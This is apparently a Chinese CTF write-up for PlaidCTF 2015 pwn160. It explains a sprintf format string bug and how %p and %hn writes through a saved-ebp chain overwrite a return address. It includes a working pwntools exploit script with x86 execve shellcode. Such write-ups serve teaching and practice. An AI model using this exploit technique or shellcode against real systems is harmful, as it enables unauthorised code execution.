---
title: PlaidCTF CTF 2015 pwn160 
date: 2017-04-14 21:44:19
tags:
- 指针
- 格式化字符串漏洞
- pwn
---
PlaidCTF CTF 2015 pwn160格式化字符串漏洞之前指针没有理解好，所以理解这题的攻击花了不少功夫，记录一下思路：程序中的sprintf第三个参数format由我们控制，存在明显的格式化字符串漏洞。这个程序给了一个全局buf，大小为1024字节，可以植入shellcode，主要的难点是如何将某个函数的返回地址（脚本中写的是make_response返回地址）改成buf中的地址。这里用
<!-- more -->
# PlaidCTF CTF 2015 pwn160
## 格式化字符串漏洞
之前指针没有理解好，所以理解这题的攻击花了不少功夫，记录一下

### 思路：
程序中的sprintf第三个参数format由我们控制，存在明显的格式化字符串漏洞。

这个程序给了一个全局buf，大小为1024字节，可以植入shellcode，主要的难点是如何将某个函数的返回地址（脚本中写的是make_response返回地址）改成buf中的地址。

这里用到两种关键的格式化字符:

“%?$p”

这个格式化字符串打印相对format参数正向偏移任意栈地址中的内容，其中的p可以用d，x等替代

“%(number)c%?$hn”

这个格式化字符串可以实现向第？个参数存的地址的低字节中写数据，数据值为number的值（%hn，将指针视为 short 型指针，更为常用，因为要写入多大的数字，就需要打印多少个字符，如果直接用 int 操作，数字较大时打印会很慢，所以经常用%hn分两步进行）。 
~~~
注意这里的%(number)c%?n(或%?hn)是把从格式化字符串所在栈地址开始，正向偏移的第?个栈地址中存放的值取出，作为一个地址（addr），并往这个addr中写入number这个数值
~~~

这里用%hn，只能够向addr这个地址的低2字节写入数据（number），为什么是低2字节而不是高2字节？因为x86以低地址作为存储字地址。如果要用%hn向某个地址的高地址写入数据，则需要修改第?个参数中存储的值，也就是这个addr，将其改为addr+2即可。

说完了这一题用到的知识点，再来说一说这一题的难点。
~~~
这一题的难点在于，由于我们的目标是利用格式化字符串漏洞修改make_response这个函数的返回地址，那就需要用到%n.

就如之前分析的，栈上需要有一个在格式化字符串参数正向偏移位置的地址，所存的值是存着make_response的返回地址的栈地址(addr1).

然后才能用这个%n来将addr1中的make_response的地址修改为shellcode的地址。

去哪找这么一个地址呢？这题的题目就是一个提示--ebp
~~~

ps:我暂时没发现这题有什么其他栈溢出漏洞，其他类型的漏洞如果有的话一定洗耳恭听

exploit：
~~~
#encoding=utf8
from pwn import *
buf_addr = 0x804A080
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x52\x53\x54\x59\x0f\x34"
padding_len = (buf_addr & 0xffff) - len(shellcode)
# "&"'s priority is lower then "-"
io = process("./ebp")
io.sendline("%4$p")                                            #step1
#the forth parma storing echo's ebp, 
#which is a pointer storing main's ebp addr
main_ebp_addr = int(io.recvline(),16)
mr_ret_addr = (main_ebp_addr - 0x1c) & 0xffff
io.sendline("%"+str(mr_ret_addr) +"c%4$hn")                        #step2
#make main's ebp as a pointer of mr_ret_addr
io.sendline(shellcode + "%"+str(padding_len)+"c%12$hn")            #step3
io.interactive()
~~~

思路：

步骤1.

打印出（存echo返回地址的栈地址-4）这个栈地址中的内容，因为这里面存着main函数的ebp的地址，通过这个地址，可以计算出存有make_response的返回地址的栈地址(记为a0)。

步骤2.

将main函数的ebp修改为了a0，这之后，main的ebp就可以作为%n需要的地址来修改a0中的值（原来是make_response的返回地址）了。

步骤3.

将存有shellcode的buf（全局变量）的地址用%n写入，修改了make_response的返回地址，完成攻击。
